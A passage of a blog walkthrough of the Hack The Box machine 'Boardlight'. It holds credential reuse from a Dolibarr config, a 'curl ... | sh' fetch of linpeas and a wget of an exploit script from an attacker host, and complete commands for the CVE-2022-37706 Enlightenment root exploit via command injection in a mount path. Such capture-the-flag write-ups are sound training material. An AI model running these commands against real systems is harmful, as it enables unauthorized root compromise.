+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dolibarr_main_prod</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_force_https</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_restrict_os_commands</span><span class="o">=</span><span class="s1">&#39;mysqldump, mysql, pg_dump, pgrestore&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_nocsrfcheck</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_instance_unique_id</span><span class="o">=</span><span class="s1">&#39;ef9a8f59524328e3c36894a9ff0562b5&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_mailing_limit_sendbyweb</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_mailing_limit_sendbycli</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_distrib</span><span class="o">=</span><span class="s1">&#39;standard&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><h3 id="attempt-1">Attempt 1<a hidden class="anchor" aria-hidden="true" href="#attempt-1">#</a></h3>
+<p>We have now credentials for the database connection. I have observed one interesting thing when reading the machine description:</p>
+<blockquote>
+<p>After enumerating and dumping the web configuration file contents, plaintext credentials lead to <code>SSH</code> access to the machine.</p></blockquote>
+<p><strong>Kind of rabbit hole? Yessssss!🫣</strong></p>
+<p>I tried to access the user dolibarr with the password given for that user. It was a trap.
+<img alt="Access Dolibarr User with the creds found in config file" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703120138.png"></p>
+<h3 id="attempt-2">Attempt 2<a hidden class="anchor" aria-hidden="true" href="#attempt-2">#</a></h3>
+<p>We try to log in as a root using the password we found in the configuration file. It was showing the authentication failure.</p>
+<pre tabindex="0"><code>www-data@boardlight:~/html$ su -
+Password: 
+su: Authentication failure
+</code></pre><p>Let&rsquo;s try to log in with user <code>larissa</code> with the same password. Looks like it worked!!!</p>
+<pre tabindex="0"><code>www-data@boardlight:~/html$ su - larissa
+Password: 
+larissa@boardlight:~$ whoami
+larissa
+</code></pre><p><strong>Credentials:</strong></p>
+<pre tabindex="0"><code>Username: larissa
+Password: #############
+</code></pre><p><img alt="SSH into machine" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703120219.png"></p>
+<h3 id="user-flag-">User Flag 🚩<a hidden class="anchor" aria-hidden="true" href="#user-flag-">#</a></h3>
+<p>Run <strong><code>dir</code></strong> command to list the files and folders</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">larissa@boardlight:~$ ls
+</span></span><span class="line"><span class="cl">Desktop    Downloads  Pictures  Templates  Videos
+</span></span><span class="line"><span class="cl">Documents  Music      Public    user.txt
+</span></span></code></pre></div><p>We have the user.txt flag here!!!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">larissa@boardlight:~$ cat user.txt
+</span></span><span class="line"><span class="cl"><span class="c1">###############################</span>
+</span></span></code></pre></div><h2 id="exploiting-dolibarr-for-rce-cve-2023-30253">Exploiting Dolibarr for RCE (CVE-2023-30253)<a hidden class="anchor" aria-hidden="true" href="#exploiting-dolibarr-for-rce-cve-2023-30253">#</a></h2>
+<h3 id="linpeas">Linpeas<a hidden class="anchor" aria-hidden="true" href="#linpeas">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">larissa@boardlight:~$ curl -L http://10.10.16.5:8000/linpeas.sh <span class="p">|</span> sh
+</span></span></code></pre></div><p><strong>Interesting Output from linpease:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 15K Jul  <span class="m">8</span>  <span class="m">2019</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root 15K Apr  <span class="m">8</span>  <span class="m">2024</span> /usr/lib/xorg/Xorg.wrap
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 27K Jan <span class="m">29</span>  <span class="m">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  ---&gt;  Before_0.25.4_<span class="o">(</span>CVE-2022-37706<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 15K Jan <span class="m">29</span>  <span class="m">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  ---&gt;  Before_0.25.4_<span class="o">(</span>CVE-2022-37706<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 15K Jan <span class="m">29</span>  <span class="m">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  ---&gt;  Before_0.25.4_<span class="o">(</span>CVE-2022-37706<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 15K Jan <span class="m">29</span>  <span class="m">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset <span class="o">(</span>Unknown SUID binary!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus 51K Oct <span class="m">25</span>  <span class="m">2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 467K Jan  <span class="m">2</span>  <span class="m">2024</span> /usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root dip 386K Jul <span class="m">23</span>  <span class="m">2020</span> /usr/sbin/pppd  ---&gt;  Apple_Mac_OSX_10.4.8<span class="o">(</span>05-2007<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 44K Feb  <span class="m">6</span>  <span class="m">2024</span> /usr/bin/newgrp  ---&gt;  HP-UX_10.20
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 55K Apr  <span class="m">9</span>  <span class="m">2024</span> /usr/bin/mount  ---&gt;  Apple_Mac_OSX<span class="o">(</span>Lion<span class="o">)</span>_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 163K Apr  <span class="m">4</span>  <span class="m">2023</span> /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 67K Apr  <span class="m">9</span>  <span class="m">2024</span> /usr/bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 84K Feb  <span class="m">6</span>  <span class="m">2024</span> /usr/bin/chfn  ---&gt;  SuSE_9.3/10
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 39K Apr  <span class="m">9</span>  <span class="m">2024</span> /usr/bin/umount  ---&gt;  BSD/Linux<span class="o">(</span>08-1996<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 87K Feb  <span class="m">6</span>  <span class="m">2024</span> /usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 67K Feb  <span class="m">6</span>  <span class="m">2024</span> /usr/bin/passwd  ---&gt;  Apple_Mac_OSX<span class="o">(</span>03-2006<span class="o">)</span>/Solaris_8/9<span class="o">(</span>12-2004<span class="o">)</span>/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1<span class="o">(</span>02-1997<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 39K Mar  <span class="m">7</span>  <span class="m">2020</span> /usr/bin/fusermount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 52K Feb  <span class="m">6</span>  <span class="m">2024</span> /usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root 15K Oct <span class="m">27</span>  <span class="m">2023</span> /usr/bin/vmware-user-suid-wrapper
+</span></span></code></pre></div><p><strong>Another way to find a package with special permission:</strong></p>
+<pre tabindex="0"><code>find / -perm -4000 2&gt;/dev/null
+</code></pre><p>Here in the output, it was observed that the enlightenment package is vulnerable to CVE-2022-37706, which allows local users to escalate their privileges to root level.</p>
+<p><strong>Let&rsquo;s grep the enlightenment package name and confirm its availability:</strong></p>
+<pre tabindex="0"><code>dpkg -l | grep &#34;enlightenment&#34;
+</code></pre><h3 id="enlightenment---cve-2022-37706">Enlightenment - CVE-2022-37706<a hidden class="anchor" aria-hidden="true" href="#enlightenment---cve-2022-37706">#</a></h3>
+<p><strong>Enlightenment</strong> is a lightweight, eye-candy-rich <strong>X11 window manager</strong> and <strong>desktop environment</strong> for Linux and UNIX systems. It is designed for speed and customisation, offering advanced features like compositing, animations, and modular design. While not as mainstream as GNOME or KDE, it’s popular in niche or performance-focused Linux setups.</p>
+<p><strong>CVE-2022-37706</strong> is a <strong>local privilege escalation vulnerability</strong> in the <code>enlightenment_sys</code> binary. It arises due to <strong>improper sanitisation of user input</strong> passed to shell commands.</p>
+<ul>
+<li>Specifically, <code>enlightenment_sys</code> uses the <code>system()</code> function to call <code>mount</code> with user-provided paths.</li>
+<li>If an attacker supplies a malicious path that includes <strong>shell metacharacters</strong> (like <code>;</code>), they can <strong>inject arbitrary commands</strong>.</li>
+<li>Because <code>enlightenment_sys</code> runs as root, <strong>those injected commands are executed as root</strong>.</li>
+</ul>
+<blockquote>
+<p>Systems running a vulnerable version of Enlightenment (before v0.25.4) are <strong>highly exploitable</strong></p></blockquote>
+<h4 id="exploit-cve-2022-37706">Exploit CVE-2022-37706<a hidden class="anchor" aria-hidden="true" href="#exploit-cve-2022-37706">#</a></h4>
+<p>The enlightenment is running on version <code>0.23.1</code>, which is vulnerable to CVE-2022-37706.</p>
+<pre tabindex="0"><code>larissa@boardlight:~$ enlightenment --version
+ESTART: 0.00001 [0.00001] - Begin Startup
+ESTART: 0.00007 [0.00007] - Signal Trap
+ESTART: 0.00009 [0.00002] - Signal Trap Done
+ESTART: 0.00011 [0.00002] - Eina Init
+ESTART: 0.00047 [0.00037] - Eina Init Done
+ESTART: 0.00052 [0.00004] - Determine Prefix
+ESTART: 0.00075 [0.00023] - Determine Prefix Done
+ESTART: 0.00077 [0.00002] - Environment Variables
+ESTART: 0.00079 [0.00002] - Environment Variables Done
+ESTART: 0.00080 [0.00001] - Parse Arguments
+Version: 0.23.1
+E: Begin Shutdown Procedure!
+</code></pre><p><img alt="CVE-2022-37706 Exploit - Github" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703123244.png"></p>
+<pre tabindex="0"><code>larissa@boardlight:/tmp$ wget 10.10.14.5/exploit.sh
+--2025-07-02 23:59:29--  http://10.10.14.5/exploit.sh
+Connecting to 10.10.14.5:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 709 [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                              100%[============================================================================&gt;]     709  --.-KB/s    in 0s      
+
+2025-07-02 23:59:29 (45.8 MB/s) - ‘exploit.sh’ saved [709/709]
+</code></pre><pre tabindex="0"><code>larissa@boardlight:/tmp$ chmod +x exploit.sh 
+larissa@boardlight:/tmp$ ./exploit.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can&#39;t find in /etc/fstab.
+# whoami
+root
+</code></pre><h3 id="root-flag-">Root Flag 🚩<a hidden class="anchor" aria-hidden="true" href="#root-flag-">#</a></h3>
+<pre tabindex="0"><code># ls
+root.txt
+</code></pre><pre tabindex="0"><code># cat root.txt
+###############################
+</code></pre><h3 id="how-does-cve-2022-37706-works">How does CVE-2022-37706 works?<a hidden class="anchor" aria-hidden="true" href="#how-does-cve-2022-37706-works">#</a></h3>
+<h4 id="find-the-suid-binaries-on-the-system-files-that-run-with-root">Find the SUID binaries on the system files that run with root<a hidden class="anchor" aria-hidden="true" href="#find-the-suid-binaries-on-the-system-files-that-run-with-root">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><ul>
+<li><code>find /</code>: Search recursively starting from the root <code>/</code> directory.</li>
+<li><code>-perm -4000</code>: Look for files with the <strong>SUID (Set User ID) bit set</strong>.
+<ul>
+<li><code>4000</code> is the <strong>octal permission</strong> flag for the SUID bit.</li>
+<li>This means the file, when executed, runs with the <strong>permissions of its owner</strong> (usually root), not the user who launched it.</li>
+</ul>
+</li>
+<li><code>2&gt;/dev/null</code>: Silences permission-denied errors by redirecting STDERR (file descriptor 2) to <code>/dev/null</code></li>
+</ul>
+<p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+</span></span></code></pre></div><ul>
+<li>This binary is <strong>setuid root</strong>, which means it always runs with root privileges.</li>
+<li>It&rsquo;s supposed to wrap commands like <code>mount safely</code>, but it uses <strong><code>system()</code></strong> and fails to sanitize input properly.</li>
+</ul>
+<h4 id="step-1-setup-required-directory"><strong>Step 1:</strong> Setup Required Directory<a hidden class="anchor" aria-hidden="true" href="#step-1-setup-required-directory">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p /tmp/net
+</span></span><span class="line"><span class="cl">mkdir -p <span class="s2">&#34;/dev/../tmp/;/tmp/exploit&#34;</span>
+</span></span></code></pre></div><ul>
+<li>The first line creates a target mount point (<code>/tmp/net</code>).</li>
+<li>The second line creates a <strong>maliciously crafted path</strong> that:
+<ul>
+<li><strong>Starts with <code>/dev/..</code></strong> to bypass Enlightenment’s path sanitization.</li>
+<li>Contains a semicolon <code>;</code>, which <strong>breaks the command</strong> and starts a new one: <code>/tmp/exploit</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="step-2-write-into-file-and-permission-assignment"><strong>Step 2:</strong> Write into file and Permission assignment<a hidden class="anchor" aria-hidden="true" href="#step-2-write-into-file-and-permission-assignment">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/sh&#34;</span> &gt; /tmp/exploit
+</span></span><span class="line"><span class="cl">chmod a+x /tmp/exploit
+</span></span></code></pre></div><ul>
+<li>This creates a file <code>/tmp/exploit</code> that, when executed, opens a shell.</li>
+<li>With <code>chmod a+x</code>, it&rsquo;s made executable.</li>
+</ul>
+<h4 id="step-3-trigger-the-exploit"><strong>Step 3:</strong> Trigger the exploit<a hidden class="anchor" aria-hidden="true" href="#step-3-trigger-the-exploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> /bin/mount <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -o noexec,nosuid,utf8,nodev,iocharset<span class="o">=</span>utf8,utf8<span class="o">=</span>0,utf8<span class="o">=</span>1,uid<span class="o">=</span><span class="k">$(</span>id -u<span class="k">)</span>, <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> <span class="s2">&#34;/dev/../tmp/;/tmp/exploit&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  /tmp///net
+</span></span><span class="line"><span class="cl"><span class="c1"># This command exploits CVE-2022-37706 by injecting a command via the mount path.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The semicolon (;) in the path allows execution of /tmp/exploit as root.</span>
+</span></span></code></pre></div><p>It looks like a normal mount command wrapped by <code>enlightenment_sys</code>.</p>
+<ul>
+<li><code>enlightenment_sys</code> passes this entire string to <code>system(...)</code> without escaping.</li>
+<li>The semicolon <code>;</code> splits the command.</li>
+<li>The second part <code>/tmp/exploit</code> executes independently <strong>as root</strong>.</li>
+</ul>
+<p><strong>When enlightenment runs the final command It will become like this:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/mount -o ... /dev/../tmp/<span class="p">;</span> /tmp/exploit /tmp///net
+</span></span></code></pre></div><p>The part after the semicolon (<code>/tmp/exploit</code>) is executed <strong>as root</strong>, opening a <strong>root shell</strong>.</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Boardlight is a great hands-on example of how small oversights in system-level binaries can lead to complete system compromise. From a fairly simple web foothold to a local privilege escalation via a public CVE, the machine teaches the value of enumeration and understanding the behaviour of SUID programs. It reinforces that post-exploitation knowledge is just as crucial as initial access.</p>
+<h3 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h3>
+<ul>
+<li>Checking for SUID binaries can quickly reveal potential privilege escalation vectors.</li>
+<li><strong>CVE-2022-37706</strong> is a prime example of how input sanitisation failures in root-level binaries can lead to full system compromise.</li>
+</ul>
+<h3 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h3>
+<ul>
+<li><a href="https://www.wiz.io/vulnerability-database/cve/cve-2023-30253">https://www.wiz.io/vulnerability-database/cve/cve-2023-30253</a></li>
+<li><a href="https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595">https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595</a></li>
+<li><a href="https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253">https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253</a></li>
+<li><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit</a></li>
+<li><a href="https://www.wiz.io/vulnerability-database/cve/cve-2022-37706">https://www.wiz.io/vulnerability-database/cve/cve-2022-37706</a></li>
+<li><a href="https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html">https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html</a></li>
+</ul>
+<h2 id="connect-with-me">Connect with Me<a hidden class="anchor" aria-hidden="true" href="#connect-with-me">#</a></h2>
+<ul>
+<li><a href="https://www.linkedin.com/in/bhavik-kanejiya">LinkedIn</a></li>
+<li><a href="https://twitter.com/bhavik_kanejiya">Twitter</a></li>
+<li><a href="https://github.com/bhavik-kanejiya">GitHub</a></li>
+<li><a href="https://app.hackthebox.com/users/1998342">Hack The Box</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></li>
+      <li><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://bhavik-kanejiya.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://bhavik-kanejiya.github.io/tags/cve-2023-30253/">CVE-2023-30253</a></li>
+      <li><a href="https://bhavik-kanejiya.github.io/tags/cve-2022-37706/">CVE-2022-37706</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://bhavik-kanejiya.github.io/blog/kubernetes-security-basics-from-a-pentesters-point-of-view/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Kubernetes Security Basics: From a Pentester’s Point of View</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>© 2025 Bhavik Kanejiya</span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
